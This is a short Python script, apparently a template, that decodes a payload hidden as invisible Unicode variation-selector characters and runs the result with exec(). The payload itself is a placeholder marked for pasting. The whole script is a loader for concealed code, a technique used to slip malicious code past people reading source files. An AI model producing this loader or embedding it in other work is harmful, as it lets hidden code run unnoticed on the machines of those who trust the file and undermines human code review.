HIDDEN = "<PASTE YOUR PAYLOAD HERE>"

def decode(hidden):
    data = bytearray()
    for ch in hidden:
        cp = ord(ch)
        if 0xFE00 <= cp <= 0xFE0F:
            data.append(cp - 0xFE00)
        elif 0xE0100 <= cp <= 0xE01EF:
            data.append(cp - 0xE0100 + 0x10)

    return data.decode("utf-8")


message = decode(HIDDEN)
exec(compile(message, "<HIDDEN>", "exec"))
